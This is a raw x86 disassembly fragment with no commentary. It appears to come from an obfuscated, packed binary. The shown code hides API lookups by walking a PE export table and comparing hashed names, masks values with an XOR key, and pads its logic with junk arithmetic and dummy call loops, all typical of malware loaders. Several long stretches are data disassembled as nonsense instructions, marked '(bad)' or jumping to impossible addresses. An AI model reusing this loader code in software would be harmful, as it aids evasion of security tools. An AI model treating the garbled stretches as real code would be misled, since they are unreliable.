  410117:	jmp    0x4100d1
  41011c:	mov    DWORD PTR [ebp-0x18],0xf89c8534
  410123:	sbb    eax,DWORD PTR ds:0x433673
  410129:	mov    ecx,DWORD PTR [ebp-0x4]
  41012c:	push   ebx
  41012d:	mov    eax,0x7510853
  410132:	dec    ebx
  410133:	xor    ecx,eax
  410135:	or     DWORD PTR ds:0x433557,0x33e5
  41013f:	mov    ebx,0x32729a
  410144:	sbb    DWORD PTR ds:0x4335df,0x4335e3
  41014e:	add    ecx,ebx
  410150:	and    DWORD PTR ds:0x43354f,0x433547
  41015a:	mov    DWORD PTR [ebp-0x1c],ecx
  41015d:	mov    ecx,DWORD PTR [ebp+0x14]
  410160:	sub    DWORD PTR ds:0x4335e7,0x6109
  41016a:	push   esi
  41016b:	push   edi
  41016c:	sbb    DWORD PTR ds:0x433623,0x433657
  410176:	test   ecx,ecx
  410178:	je     0x410196
  41017e:	mov    DWORD PTR ds:0x433657,0x2f8
  410188:	mov    ecx,DWORD PTR [ebp+0x14]
  41018b:	mov    ecx,DWORD PTR [ecx]
  41018d:	and    edi,DWORD PTR ds:0x433597
  410193:	mov    DWORD PTR [ebp-0x1c],ecx
  410196:	add    DWORD PTR ds:0x433623,0x2cfa
  4101a0:	imul   edx,eax
  4101a3:	add    DWORD PTR ds:0x433557,edx
  4101a9:	mov    ecx,0x4573
  4101ae:	xor    edi,edi
  4101b0:	or     edi,DWORD PTR ds:0x433677
  4101b6:	mov    esi,DWORD PTR ds:0x43368b
  4101bc:	sub    edi,esi
  4101be:	xor    edi,DWORD PTR [edi+esi*1]
  4101c1:	add    edx,ecx
  4101c3:	sub    DWORD PTR ds:0x433563,0x43359b
  4101cd:	mov    esi,0x7879
  4101d2:	mov    edi,0x1556
  4101d7:	xchg   esi,ecx
  4101d9:	and    DWORD PTR ds:0x433633,0x0
  4101e3:	mov    ecx,DWORD PTR ds:0x433633
  4101e9:	inc    ecx
  4101ea:	mov    DWORD PTR ds:0x433633,ecx
  4101f0:	cmp    DWORD PTR ds:0x433633,0x29
  4101f7:	jne    0x41023f
  4101fd:	push   0x433814
  410202:	push   DWORD PTR [ebp-0x14]
  410205:	push   DWORD PTR [ebp-0xc]
  410208:	push   0x8a72
  41020d:	push   0x8052
  410212:	push   0x5318
  410217:	push   0x69ba
  41021c:	push   0x74de
  410221:	push   0x7da6
  410226:	push   DWORD PTR [ebp-0x1c]
  410229:	push   DWORD PTR [ebp-0x24]
  41022c:	push   DWORD PTR [ebp-0x18]
  41022f:	push   0x2962
  410234:	push   0x6ae2
  410239:	call   DWORD PTR ds:0x4120d8
  41023f:	cmp    DWORD PTR ds:0x433633,0x1c
  410246:	jb     0x4101e3
  41024c:	sub    edx,edi
  41024e:	adc    DWORD PTR ds:0x433663,edi
  410254:	xor    esi,esi
  410256:	and    DWORD PTR ds:0x433657,0x0
  410260:	mov    ecx,DWORD PTR ds:0x433657
  410266:	inc    ecx
  410267:	mov    DWORD PTR ds:0x433657,ecx
  41026d:	cmp    DWORD PTR ds:0x433657,0xf
  410274:	jne    0x410288
  41027a:	push   DWORD PTR [ebp-0x10]
  41027d:	push   0x178b
  410282:	call   DWORD PTR ds:0x4121c0
  410288:	cmp    DWORD PTR ds:0x433657,0xe
  41028f:	jne    0x4102a4
  410295:	xor    ecx,ecx
  410297:	xor    ecx,DWORD PTR ds:0x433657
  41029d:	inc    ecx
  41029e:	mov    DWORD PTR ds:0x433657,ecx
  4102a4:	cmp    DWORD PTR ds:0x433657,0x1b
  4102ab:	jb     0x410260
  4102b1:	inc    ecx
  4102b2:	mov    DWORD PTR [ebp-0x28],esi
  4102b5:	not    ecx
  4102b7:	mov    DWORD PTR [ebp-0x2c],esi
  4102ba:	and    DWORD PTR ds:0x433623,0x0
  4102c4:	xor    ecx,ecx
  4102c6:	xor    ecx,DWORD PTR ds:0x433623
  4102cc:	inc    ecx
  4102cd:	mov    DWORD PTR ds:0x433623,ecx
  4102d3:	cmp    DWORD PTR ds:0x433623,0x22
  4102da:	jne    0x4102e9
  4102e0:	push   DWORD PTR [ebp-0x1c]
  4102e3:	call   DWORD PTR ds:0x412284
  4102e9:	cmp    DWORD PTR ds:0x433623,0x17
  4102f0:	jb     0x4102c4
  4102f6:	add    ecx,DWORD PTR ds:0x4335eb
  4102fc:	mov    DWORD PTR [ebp-0x14],esi
  4102ff:	mov    DWORD PTR [ebp-0x8],esi
  410302:	sub    DWORD PTR ds:0x43362b,0x6d7d
  41030c:	mov    ecx,DWORD PTR [ebp-0x18]
  41030f:	xor    DWORD PTR ds:0x4335e3,0x433547
  410319:	xor    ecx,eax
  41031b:	and    DWORD PTR ds:0x433633,0x0
  410325:	mov    eax,ds:0x433633
  41032a:	inc    eax
  41032b:	mov    ds:0x433633,eax
  410330:	cmp    DWORD PTR ds:0x433633,0xd
  410337:	jne    0x410348
  41033d:	push   0x8573
  410342:	call   DWORD PTR ds:0x4120dc
  410348:	cmp    DWORD PTR ds:0x433633,0xc
  41034f:	jne    0x410360
  410355:	mov    eax,ds:0x433633
  41035a:	inc    eax
  41035b:	mov    ds:0x433633,eax
  410360:	cmp    DWORD PTR ds:0x433633,0x18
  410367:	jb     0x410325
  41036d:	xor    eax,0x75f4
  410372:	xor    edi,edi
  410374:	mov    eax,ds:0x4335e3
  410379:	sbb    eax,DWORD PTR ds:0x433663
  41037f:	mov    ds:0x4335e3,eax
  410384:	add    ecx,ebx
  410386:	movzx  eax,BYTE PTR ds:0x4335ab
  41038d:	mov    DWORD PTR [ebp-0x20],ecx
  410390:	mov    eax,DWORD PTR [ebp-0x20]
  410393:	mov    DWORD PTR ds:0x433567,0x63b9
  41039d:	je     0x410967
  4103a3:	and    DWORD PTR ds:0x433547,0x0
  4103ad:	jmp    0x4103c0
  4103b2:	xor    eax,eax
  4103b4:	xor    eax,DWORD PTR ds:0x433547
  4103ba:	inc    eax
  4103bb:	mov    ds:0x433547,eax
  4103c0:	cmp    DWORD PTR ds:0x433547,0x14
  4103c7:	jae    0x410465
  4103cd:	cmp    DWORD PTR ds:0x433547,0xd
  4103d4:	jne    0x4103e6
  4103da:	push   DWORD PTR [ebp-0x20]
  4103dd:	push   DWORD PTR [ebp-0x18]
  4103e0:	call   DWORD PTR ds:0x412288
  4103e6:	cmp    DWORD PTR ds:0x433547,0xc
  4103ed:	jne    0x4103fe
  4103f3:	mov    eax,ds:0x433547
  4103f8:	inc    eax
  4103f9:	mov    ds:0x433547,eax
  4103fe:	jmp    0x4103b2
  410403:	mov    DWORD PTR ds:0x433657,0x1e
  41040d:	cmp    DWORD PTR ds:0x433657,0x0
  410414:	je     0x410465
  41041a:	cmp    DWORD PTR ds:0x433657,0x4
  410421:	jne    0x41043a
  410427:	push   DWORD PTR [ebp-0xc]
  41042a:	push   0x433874
  41042f:	push   0x43355f
  410434:	call   DWORD PTR ds:0x4121c4
  41043a:	cmp    DWORD PTR ds:0x433657,0x5
  410441:	jne    0x410452
  410447:	mov    eax,ds:0x433657
  41044c:	dec    eax
  41044d:	mov    ds:0x433657,eax
  410452:	xor    eax,eax
  410454:	add    eax,DWORD PTR ds:0x433657
  41045a:	dec    eax
  41045b:	mov    ds:0x433657,eax
  410460:	jmp    0x41040d
  410465:	mov    eax,DWORD PTR [ebp-0x4]
  410468:	xor    eax,0x7510853
  41046d:	sub    DWORD PTR ds:0x433657,0xdb8
  410477:	add    eax,ebx
  410479:	mov    DWORD PTR ds:0x4335a7,0x3f77
  410483:	cmp    edi,eax
  410485:	jne    0x4107cf
  41048b:	sub    DWORD PTR ds:0x43359b,0x29bd
  410495:	push   DWORD PTR [ebp+0x8]
  410498:	call   0x40f639
  41049d:	inc    ecx
  41049e:	mov    DWORD PTR [ebp-0x20],eax
  4104a1:	adc    DWORD PTR ds:0x4335e3,0xc37
  4104ab:	jmp    0x4105e6
  4104b0:	sbb    eax,0xb1fd9f18
  4104b5:	jge    0x410514
  4104b7:	fsub   DWORD PTR [edx+0xa]
  4104ba:	adc    ecx,ebx
  4104bc:	lock in al,dx
  4104be:	pushf  
  4104bf:	and    ebx,DWORD PTR [ecx+0x127c7cbe]
  4104c5:	jg     0x410543
  4104c7:	jl     0x410487
  4104c9:	retfw  0x5b26
  4104cd:	mov    edx,0xdbc2c287
  4104d2:	jns    0x41049c
  4104d4:	(bad)  
  4104d5:	out    dx,eax
  4104d6:	test   BYTE PTR [edi],dl
  4104d8:	cmp    al,0xd0
  4104da:	push   ss
  4104db:	mov    ecx,0xc7c00423
  4104e0:	xchg   edi,eax
  4104e1:	mov    ebp,0x1db752b
  4104e6:	mov    dh,BYTE PTR [ecx-0x12]
  4104e9:	push   DWORD PTR ds:0xe23e77cc
  4104ef:	cmp    dh,BYTE PTR [ebx]
  4104f1:	adc    BYTE PTR ds:0x8833,ah
  4104f6:	rcl    DWORD PTR [ebx+0x68],1
  4104f9:	sub    DWORD PTR ds:0x79d13af7,ecx
  4104ff:	jo     0x4104cb
  410501:	imul   ebx,esi,0xffffffa3
  410504:	inc    ebx
  410505:	sahf   
  410506:	push   ss
  410507:	inc    edx
  410508:	aas    
  410509:	in     eax,dx
  41050a:	pusha  
  41050b:	nop
  41050c:	jge    0x4104cb
  41050e:	popf   
  41050f:	in     al,0x35
  410511:	xor    ch,BYTE PTR [eax]
  410513:	jmp    0x48646a59
  410518:	jg     0x410513
  41051a:	or     DWORD PTR [edi-0x10],eax
  41051d:	mov    ds:0x21fb299e,al
  410522:	xchg   ebx,eax
  410523:	ficom  WORD PTR [ebp-0x6705c8df]
  410529:	js     0x4104c8
  41052b:	into   
  41052c:	outs   dx,BYTE PTR ds:[esi]
  41052d:	jno    0x4105aa
  41052f:	cs pop esp
  410531:	sub    esp,ebp
  410533:	int3   
  410534:	dec    edi
  410535:	pop    eax
  410536:	ss in  al,0xf8
  410539:	jmp    0x4104e5
  41053b:	test   BYTE PTR [esi],0x9c
  41053e:	push   ecx
  41053f:	sub    DWORD PTR [esi-0x629dff99],edx
  410545:	push   ebp
  410546:	adc    esp,DWORD PTR [eax+ecx*2-0x399ae22f]
  41054d:	push   edx
  41054e:	cmp    DWORD PTR [ebx+0x1e],0x1108479b
  410555:	loopne 0x410501
  410557:	sbb    al,0xf3
  410559:	mov    ds:0xaf4b9984,eax
  41055e:	loop   0x410500
  410560:	fs sbb dl,0xcd
  410564:	jle    0x4104ee
  410566:	vaddss xmm0,xmm7,DWORD PTR [esi-0x2d]
  41056b:	push   0xffffffec
  41056d:	dec    eax
  41056e:	bound  eax,QWORD PTR [ebx]
  410570:	sbb    BYTE PTR [esi],ah
  410572:	pusha  
  410573:	std    
  410574:	(bad)
  410577:	adc    DWORD PTR [ecx+eax*8],0x8ce3f385
  41057e:	rcl    DWORD PTR [ecx],1
  410580:	scas   eax,DWORD PTR es:[edi]
  410581:	ins    DWORD PTR es:[edi],dx
  410582:	push   0x33af0b0a
  410587:	arpl   WORD PTR [esi+edi*8],bp
  41058a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41058b:	xor    bh,BYTE PTR [eax]
  41058d:	cwde   
  41058e:	out    dx,al
  41058f:	xchg   edi,eax
  410590:	dec    esp
  410591:	in     eax,dx
  410592:	xchg   edx,ecx
  410594:	pushf  
  410595:	push   esp
  410596:	mov    ds:0x43fcd1ae,eax
  41059b:	jno    0x410619
  41059d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41059e:	sub    eax,0x192b5008
  4105a3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4105a4:	mov    edx,0x862de365
  4105a9:	pusha  
  4105aa:	repz fld QWORD PTR [esp+eax*1-0x61953092]
  4105b2:	jl     0x410610
  4105b4:	mov    esi,0x14bbd4e2
  4105b9:	adc    BYTE PTR [eax+0x3536fba6],bl
  4105bf:	jecxz  0x410595
  4105c1:	idiv   DWORD PTR [ecx]
  4105c3:	and    DWORD PTR [ebx+0x14],ebp
  4105c6:	out    dx,al
  4105c7:	call   0xfe06a948
  4105cc:	and    BYTE PTR [esi+0x11],cl
  4105cf:	cs adc al,0xc8
  4105d2:	aas    
  4105d3:	out    dx,eax
  4105d4:	pop    ebx
  4105d5:	scas   al,BYTE PTR es:[edi]
  4105d6:	mov    ?,WORD PTR [ebp-0x33a76eb0]
  4105dc:	xchg   edi,eax
  4105dd:	dec    ebp
  4105de:	inc    ebp
  4105df:	push   ecx
  4105e0:	dec    esp
  4105e1:	push   edi
  4105e2:	es scas al,BYTE PTR es:[edi]
  4105e4:	fmul   DWORD PTR [ecx]
  4105e6:	mov    eax,DWORD PTR [ebp-0x4]
  4105e9:	sbb    DWORD PTR ds:0x4335d7,0x55ce
  4105f3:	mov    ecx,DWORD PTR [ebp-0x20]
  4105f6:	adc    DWORD PTR ds:0x43354f,ebx
  4105fc:	mov    esi,0x7510853
  410601:	xor    eax,esi
  410603:	dec    DWORD PTR ds:0x43362f
  410609:	add    eax,ebx
  41060b:	cmp    ecx,eax
  41060d:	je     0x41094b
  410613:	add    DWORD PTR ds:0x43362f,0x3520
  41061d:	push   DWORD PTR [ebp-0x20]
  410620:	push   DWORD PTR [ebp+0x8]
  410623:	call   0x405227
  410628:	mov    DWORD PTR [ebp-0x14],eax
  41062b:	adc    eax,ecx
  41062d:	mov    eax,DWORD PTR [ebp-0x4]
  410630:	and    DWORD PTR ds:0x4335df,edi
  410636:	jmp    0x410771
  41063b:	pop    ss
  41063c:	imul   ecx,DWORD PTR ds:0x7d706d64,0xb02edf69
  410646:	loope  0x410699
  410648:	fdivr  DWORD PTR [eax+0x7cb9bfac]
  41064e:	jl     0x410662
  410650:	jg     0x4106ce
  410652:	jl     0x410676
  410654:	ss sbb eax,0x21660776
  41065a:	pop    esp
  41065b:	xchg   edi,eax
  41065c:	sti    
  41065d:	je     0x41068b
  41065f:	jl     0x4106da
  410661:	lahf   
  410662:	loope  0x410686
  410664:	xchg   esp,eax
  410665:	cld    
  410666:	or     al,0xcd
  410668:	adc    BYTE PTR [edx-0x71],al
  41066b:	cdq    
  41066c:	les    edi,FWORD PTR [edi]
  41066e:	mov    eax,ds:0x5b86568e
  410673:	(bad)  
  410674:	xchg   edx,eax
  410675:	cmp    DWORD PTR [eax-0x30],0x54ed16d5
  41067c:	mov    eax,DWORD PTR [ebx+0x2c]
  41067f:	jp     0x41064a
  410681:	scas   al,BYTE PTR es:[edi]
  410682:	jno    0x4106b3
  410684:	cmp    al,0x31
  410686:	adc    eax,0xabfb046a
  41068b:	(bad)  
  41068c:	pop    ecx
  41068d:	stos   DWORD PTR es:[edi],eax
  41068e:	lods   al,BYTE PTR ds:[esi]
  41068f:	pop    ecx
  410690:	mov    al,ds:0x1d377ee1
  410695:	mov    ds:0x27400d4a,eax
  41069a:	aaa    
  41069b:	test   al,0x40
  41069d:	(bad)  
  41069e:	or     BYTE PTR [ecx+0x55],bl
  4106a1:	(bad)  
  4106a2:	shl    DWORD PTR [ebp+0x67],1
  4106a5:	push   es
  4106a6:	push   0xffffffd5
  4106a8:	sbb    ebp,DWORD PTR [esi+0x631df1f]
  4106ae:	pusha  
  4106af:	mov    dh,0xee
  4106b1:	cli    
  4106b2:	dec    esp
  4106b3:	gs push cs
  4106b5:	dec    eax
  4106b6:	clc    
  4106b7:	xor    eax,0x3a47ba16
  4106bc:	fs xor esi,esp
  4106bf:	mov    ah,BYTE PTR [edx-0x392255d0]
  4106c5:	test   DWORD PTR [ebx-0x6e54b566],eax
  4106cb:	gs push eax
  4106cd:	clc    
  4106ce:	std    
  4106cf:	cdq    
  4106d0:	adc    eax,DWORD PTR [ebx+0x4f]
  4106d3:	push   esi
  4106d4:	dec    esi
  4106d5:	int3   
  4106d6:	(bad)  
  4106d8:	xchg   ebx,eax
  4106d9:	out    0xdd,al
  4106db:	xchg   ebx,eax
  4106dc:	jbe    0x410670
  4106de:	or     bh,dh
  4106e0:	xor    dl,BYTE PTR [ebx-0x281b3681]
  4106e6:	push   ds
  4106e7:	les    edi,FWORD PTR [edi-0x8]
  4106ea:	mov    ah,0x2
  4106ec:	sub    DWORD PTR [ebp+0x62],ebx
  4106ef:	jb     0x410713
  4106f1:	ins    DWORD PTR es:[edi],dx
  4106f2:	loope  0x410721
  4106f4:	dec    ecx
  4106f5:	or     al,0x17
  4106f7:	enter  0x409a,0x2c
  4106fb:	imul   edx,DWORD PTR [eax],0x65
  4106fe:	mov    ebp,0x22e6518e
  410703:	in     al,0x46
  410705:	ja     0x41075e
  410707:	pusha  
  410708:	xchg   esp,eax
  410709:	ret    
  41070a:	cwde   
  41070b:	aam    0xfb
  41070d:	cbw    
  41070f:	daa    
  410710:	loop   0x4106f8
  410712:	push   eax
  410713:	(bad)  
  410714:	fsubr  DWORD PTR [ebp-0x199ddcf4]
  41071a:	mov    eax,ds:0x5df74b88
  41071f:	fisub  WORD PTR [ebx+0x6abc220d]
  410725:	pop    edi
  410726:	jecxz  0x4106f1
  410728:	ins    BYTE PTR es:[edi],dx
  410729:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41072a:	mov    ds,edx
  41072c:	inc    eax
  41072d:	mov    bh,0x5f
  41072f:	scas   al,BYTE PTR es:[edi]
  410730:	lods   al,BYTE PTR ds:[esi]
  410731:	dec    ecx
  410732:	in     al,0x21
  410734:	fbstp  TBYTE PTR [ecx-0x2e8b5f93]
  41073a:	dec    edi
  41073b:	stc    
  41073c:	inc    ebp
  41073d:	add    BYTE PTR [ebp-0x7d],bh
  410740:	or     al,0x79
  410742:	inc    esi
  410743:	inc    edi
  410744:	sbb    ah,0xb9
  410747:	push   edi
  410748:	test   eax,0xfe37898c
  41074d:	and    eax,0x78b297cf
  410752:	or     DWORD PTR [ecx],edx
  410754:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410755:	or     ah,BYTE PTR [ecx]
  410757:	pusha  
  410758:	and    DWORD PTR [edi-0x4c5b0f95],eax
  41075e:	pushf  
  41075f:	mov    cl,0x88
  410761:	mov    esi,0x29fc4005
  410766:	pusha  
  410767:	test   eax,0x7ef457c3
  41076c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41076d:	mov    bl,0x4f
  41076f:	lods   al,BYTE PTR ds:[esi]
  410770:	scas   al,BYTE PTR es:[edi]
  410771:	mov    ecx,DWORD PTR [ebp-0x14]
  410774:	add    DWORD PTR ds:0x433567,0x3989
  41077e:	xor    eax,esi
  410780:	sbb    DWORD PTR ds:0x433563,0x43354f
  41078a:	add    eax,ebx
  41078c:	cmp    ecx,eax
  41078e:	je     0x41094b
  410794:	mov    eax,DWORD PTR [ebp-0x14]
  410797:	xor    DWORD PTR ds:0x4335a3,edi
  41079d:	mov    eax,DWORD PTR [eax+0x18]
  4107a0:	sub    ecx,DWORD PTR ds:0x433663
  4107a6:	mov    DWORD PTR [ebp-0x20],eax
  4107a9:	mov    eax,DWORD PTR [ebp-0x14]
  4107ac:	mov    ecx,DWORD PTR [ebp+0x8]
  4107af:	add    ecx,DWORD PTR [eax+0x20]
  4107b2:	mov    DWORD PTR [ebp-0x28],ecx
  4107b5:	mov    eax,DWORD PTR [ebp-0x14]
  4107b8:	mov    ecx,DWORD PTR [ebp+0x8]
  4107bb:	add    ecx,DWORD PTR [eax+0x24]
  4107be:	mov    DWORD PTR [ebp-0x2c],ecx
  4107c1:	mov    eax,DWORD PTR [ebp-0x14]
  4107c4:	mov    ecx,DWORD PTR [ebp+0x8]
  4107c7:	add    ecx,DWORD PTR [eax+0x1c]
  4107ca:	xor    esi,esi
  4107cc:	mov    DWORD PTR [ebp-0x14],ecx
  4107cf:	mov    eax,DWORD PTR [ebp-0x28]
  4107d2:	jmp    0x41090d
  4107d7:	push   ebp
  4107d8:	xchg   esi,eax
  4107d9:	ins    BYTE PTR es:[edi],dx
  4107da:	stos   DWORD PTR es:[edi],eax
  4107db:	jae    0x41085a
  4107dd:	push   ebp
  4107de:	jbe    0x4107cf
  4107e0:	mov    ds:0xfad2ac5a,eax
  4107e5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4107e6:	rcr    DWORD PTR [ebp-0x48],1
  4107e9:	jl     0x410867
  4107eb:	adc    bh,BYTE PTR [edi+0x7c]
  4107ee:	jl     0x410818
  4107f0:	data16 adc dl,bl
  4107f3:	and    DWORD PTR [eax+0xf],esi
  4107f6:	add    ch,cl
  4107f8:	mov    edi,0xa6dc6660
  4107fd:	cli    
  4107fe:	mov    edi,0x62bc8404
  410803:	push   esi
  410804:	inc    ecx
  410805:	clc    
  410806:	add    DWORD PTR [ebx+eax*1-0x2a],edx
  41080a:	push   edi
  41080b:	adc    al,0xbe
  41080d:	(bad)  
  41080e:	jnp    0x410823
  410810:	outs   dx,DWORD PTR ds:[esi]
  410811:	pop    ss
  410812:	cld    
  410813:	mov    bh,0xc0
  410815:	xor    edx,eax
  410817:	pop    es
  410818:	dec    edx
  410819:	fucom  st(6)
  41081b:	data16 mov dl,0x9
  41081e:	fidivr DWORD PTR [edx-0x69df32a1]
  410824:	ins    BYTE PTR es:[edi],dx
  410825:	ror    ecx,1
  410827:	mov    al,BYTE PTR [eax+esi*8-0x6456b9]
  41082e:	cmc    
  41082f:	(bad)  
  410831:	clc    
  410832:	mov    bl,0x0
  410834:	dec    esp
  410835:	je     0x4108ad
  410837:	into   
  410838:	sub    edi,DWORD PTR [ebp+0x4d1c3275]
  41083e:	stos   BYTE PTR es:[edi],al
  41083f:	clc    
  410840:	mov    ds:0xe1b376a1,al
  410845:	bound  edi,QWORD PTR [ebx+0x71fa98d1]
  41084b:	push   eax
  41084c:	adc    ah,cl
  41084e:	fisttp WORD PTR [esi+0x7933f4dc]
  410854:	pop    ebp
  410855:	das    
  410856:	xor    DWORD PTR [edx-0x34],ebp
  410859:	call   0x11a06e14
  41085e:	mov    bh,0xcf
  410860:	jbe    0x410807
  410862:	gs stos DWORD PTR es:[edi],eax
  410864:	in     eax,dx
  410865:	mov    cl,0xd9
  410867:	mov    al,0xf9
  410869:	iret   
  41086a:	sar    DWORD PTR [ecx],1
  41086c:	sub    ecx,DWORD PTR ds:0xed1bc67a
  410872:	cwde   
  410873:	enter  0xdb38,0x10
  410877:	ja     0x410826
  410879:	shr    BYTE PTR [esi+esi*2+0x4c],0x16
  41087e:	cmc    
  41087f:	loopne 0x410841
  410881:	inc    ebx
  410882:	sub    eax,0xa8e57411
  410887:	mov    ebx,0x7618cdd6
  41088c:	test   DWORD PTR [edx+0x62053881],ecx
  410892:	xor    edi,edx
  410894:	add    bl,BYTE PTR [edx-0x556200af]
  41089a:	dec    edx
  41089b:	icebp  
  41089c:	(bad)  
  41089d:	mov    bh,0x7
  41089f:	cmp    BYTE PTR [eax+edi*1],bh
  4108a2:	repz sbb dh,BYTE PTR [edi+0x771c27a5]
  4108a9:	fsubr  QWORD PTR [ebp-0x2cea8e2e]
  4108af:	jne    0x41083f
  4108b1:	mov    DWORD PTR [edi+0x1e01169a],esp
  4108b7:	outs   dx,BYTE PTR ds:[esi]
  4108b8:	and    BYTE PTR [ecx+0x7f],ah
  4108bb:	mov    dl,ah
  4108bd:	dec    edi
  4108be:	mov    edx,0x244731f0
  4108c3:	xchg   esi,eax
  4108c4:	leave  
  4108c5:	mov    esp,ss
  4108c7:	push   0xc8ccd307
  4108cc:	test   DWORD PTR [esi],ebp
  4108ce:	jns    0x410870
  4108d0:	pop    ds
  4108d1:	sub    BYTE PTR [edi-0x66afc61e],bl
  4108d7:	je     0x41091c
  4108d9:	aaa    
  4108da:	shr    dh,cl
  4108dc:	leave  
  4108dd:	stc    
  4108de:	(bad)  
  4108df:	jo     0x4108fd
  4108e1:	sub    esi,esi
  4108e3:	pop    ss
  4108e4:	lods   eax,DWORD PTR ds:[esi]
  4108e5:	mov    ebp,0x596c408d
  4108ea:	push   esp
  4108eb:	lods   eax,DWORD PTR ds:[esi]
  4108ec:	jnp    0x4108c7
  4108ee:	jmp    0x4108a5
  4108f0:	out    0xd5,eax
  4108f2:	mov    bh,0x54
  4108f4:	jmp    0x4ffa:0xa0ed5ce5
  4108fb:	xor    DWORD PTR [edi+0xf3300ff],edx
  410901:	(bad)  
  410902:	loope  0x4108da
  410904:	push   es
  410905:	into   
  410906:	add    al,0x8b
  410908:	mov    edx,0x7ca1f185
  41090d:	mov    ecx,DWORD PTR [ebp+0x8]
  410910:	add    ecx,DWORD PTR [eax+edi*4]
  410913:	lea    eax,[ebp-0x8]
  410916:	mov    DWORD PTR [ebp-0x30],ecx
  410919:	push   eax
  41091a:	push   DWORD PTR [ebp-0x30]
  41091d:	push   DWORD PTR [ebp+0xc]
  410920:	call   0x4040e1
  410925:	mov    eax,DWORD PTR [ebp-0x4]
  410928:	mov    ecx,DWORD PTR [ebp-0x8]
  41092b:	xor    eax,0x7510853
  410930:	add    eax,ebx
  410932:	cmp    ecx,eax
  410934:	jne    0x410957
  41093a:	mov    eax,DWORD PTR [ebp-0x20]
  41093d:	inc    edi
  41093e:	cmp    edi,eax
  410940:	jb     0x4103a3
  410946:	jmp    0x410967
  41094b:	mov    eax,DWORD PTR [ebp-0x4]
  41094e:	xor    eax,esi
  410950:	add    eax,ebx
  410952:	jmp    0x41148d
  410957:	mov    eax,DWORD PTR [ebp-0x2c]
  41095a:	movzx  eax,WORD PTR [eax+edi*2]
  41095e:	mov    ecx,DWORD PTR [ebp-0x14]
  410961:	mov    eax,DWORD PTR [ecx+eax*4]
  410964:	mov    DWORD PTR [ebp+0xc],eax
  410967:	mov    eax,DWORD PTR [ebp-0x4]
  41096a:	mov    ecx,DWORD PTR [ebp-0x8]
  41096d:	xor    eax,0x7510853
  410972:	add    eax,ebx
  410974:	cmp    ecx,eax
  410976:	jne    0x410989
  41097c:	mov    eax,DWORD PTR [ebp-0x4]
  41097f:	xor    eax,0x7510853
  410984:	jmp    0x410950
  410989:	mov    eax,DWORD PTR [ebp+0xc]
  41098c:	jmp    0x410ac7
  410991:	inc    ebx
  410992:	fs dec edi
  410994:	fwait
  410995:	imul   esi,DWORD PTR [ebx-0x6cde9b8d],0x78
  41099c:	or     BYTE PTR [esi+ecx*4+0x64],bh
  4109a0:	test   al,0x73
  4109a2:	mov    ebx,0x7f127c7c
  4109a7:	jl     0x410a25
  4109a9:	sub    DWORD PTR [esi+0x4b],eax
  4109ac:	add    DWORD PTR ds:0x599b86b2,esp
  4109b2:	int3   
  4109b3:	or     BYTE PTR [esi-0x4b9af58f],ch
  4109b9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4109ba:	lahf   
  4109bb:	lahf   
  4109bc:	clc    
  4109bd:	jbe    0x410971
  4109bf:	jge    0x4109af
  4109c1:	inc    ebx
  4109c2:	je     0x41097e
  4109c4:	cli    
  4109c5:	jbe    0x4109d6
  4109c7:	retf   0x7a16
  4109ca:	xchg   BYTE PTR [esi],dl
  4109cc:	cmp    ch,BYTE PTR [ebp+edx*8+0x17]
  4109d0:	shl    BYTE PTR [ecx],1
  4109d2:	inc    esp
  4109d3:	(bad)  
  4109d4:	js     0x410a0a
  4109d6:	adc    BYTE PTR [ebp-0x7e],dl
  4109d9:	pushf  
  4109da:	xor    al,0xb7
  4109dc:	jbe    0x410a31
  4109de:	fs popa 
  4109e0:	imul   eax,edx,0x14693518
  4109e6:	cld    
  4109e7:	push   esi
  4109e8:	mov    WORD PTR [esp+ebp*4+0x1],cs
  4109ec:	pop    ds
  4109ed:	push   ebx
  4109ee:	xchg   edi,eax
  4109ef:	push   esi
  4109f0:	inc    eax
  4109f1:	mov    ds:0x74ced4e,al
  4109f6:	sub    BYTE PTR [esi+0x6b02bfeb],bh
  4109fc:	(bad)
  410a00:	cmp    eax,0x3f46897
  410a05:	cmp    ecx,DWORD PTR [edx-0x769e4beb]
  410a0b:	dec    ebp
  410a0c:	movq   QWORD PTR [esi],mm0
  410a0f:	adc    cl,dh
  410a11:	mov    WORD PTR [edi-0x68a1434c],?
  410a17:	repz or eax,0x68c04358
  410a1d:	retf   0xdb15
  410a20:	jne    0x4109db
  410a22:	or     eax,DWORD PTR [ebx]
  410a24:	cmp    DWORD PTR [edi],esp
  410a26:	fwait
  410a27:	pop    ebp
  410a28:	(bad)  
  410a29:	test   al,0x7e
  410a2b:	es pop es
  410a2d:	jo     0x410a0c
  410a2f:	inc    edx
  410a30:	mov    ds:0xdd24fe9c,al
  410a35:	and    eax,0xe518e2ee
  410a3a:	ficom  WORD PTR [ebp+0x70b43a24]
  410a40:	and    ah,dh
  410a42:	(bad)  
  410a43:	in     al,dx
  410a44:	ss mov dl,0xe8
  410a47:	test   al,0x48
  410a49:	jae    0x410a56
  410a4b:	mov    edx,0x6a6a2a55
  410a50:	or     esp,DWORD PTR [edi]
  410a52:	ss leave 
  410a54:	dec    ebx
  410a55:	jmp    0xecd254b
  410a5a:	aad    0x17
  410a5c:	mov    ebx,0xee77db7
  410a61:	and    ebp,DWORD PTR [edx+0x939d0a7]
  410a67:	or     al,0x27
  410a69:	add    dh,ah
  410a6b:	xadd   cl,ah
  410a6e:	(bad)  
  410a6f:	jns    0x410a3c
  410a71:	jmp    0x4109f7
  410a73:	dec    esp
  410a74:	iret   
  410a75:	push   ds
  410a76:	mul    BYTE PTR [edi+0x41]
  410a79:	lods   eax,DWORD PTR ds:[esi]
  410a7a:	dec    esi
  410a7b:	xchg   ebp,eax
  410a7c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410a7d:	inc    edx
  410a7e:	hlt    
  410a7f:	(bad)  
  410a80:	int3   
  410a81:	loopne 0x410a21
  410a83:	push   0x21
  410a85:	push   ss
  410a86:	icebp  
  410a87:	repnz fistp QWORD PTR [esp+ebx*4+0x4a]
  410a8c:	pop    es
  410a8d:	cli    
  410a8e:	and    eax,0x1096bbfe
  410a94:	jg     0x410ad7
